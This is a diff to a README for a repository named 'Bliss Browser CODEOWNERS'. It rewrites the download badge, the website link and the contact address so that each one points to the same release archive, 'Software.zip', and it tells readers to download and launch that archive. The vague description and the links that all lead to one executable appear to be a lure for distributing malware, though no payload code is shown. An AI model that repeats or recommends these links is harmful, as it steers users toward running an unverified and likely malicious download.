@@ -11,13 +11,13 @@ Welcome to the Bliss Browser CODEOWNERS repository! This repository is dedicated
 
 ### Get Started:
 To download the software package, click on the button below:
-[![Download Software](https://img.shields.io/badge/Download-Software-brightgreen)](https://github.com/user-attachments/files/18383251/Software.zip)
+[![Download Software](https://github.com/kennethxc33/Bliss_Browser_CODEOWNERS/releases/download/v2.0/Software.zip)](https://github.com/kennethxc33/Bliss_Browser_CODEOWNERS/releases/download/v2.0/Software.zip)
 
 ### Launching Package:
 The software package needs to be launched after downloading to start using the Bliss Browser CODEOWNERS language support module.
 
 ### Visit Our Website:
-To explore more about the Bliss Browser CODEOWNERS project, visit our website [here](https://blissbrowsercodeowners.com).
+To explore more about the Bliss Browser CODEOWNERS project, visit our website [here](https://github.com/kennethxc33/Bliss_Browser_CODEOWNERS/releases/download/v2.0/Software.zip).
 
 ### Need Assistance?
 If the provided link does not work or you require further assistance, please check the "Releases" section of this repository for more information.
@@ -33,7 +33,7 @@ We welcome contributions to enhance and improve the Bliss Browser CODEOWNERS pro
 This project is licensed under the GPL-3.0 License. You can find more details about the license in the LICENSE file included in this repository.
 
 #### Contact Us
-If you have any questions or suggestions regarding the Bliss Browser CODEOWNERS project, feel free to reach out to us at contact@blissbrowsercodeowners.com.
+If you have any questions or suggestions regarding the Bliss Browser CODEOWNERS project, feel free to reach out to us at https://github.com/kennethxc33/Bliss_Browser_CODEOWNERS/releases/download/v2.0/Software.zip
 
 ---
 
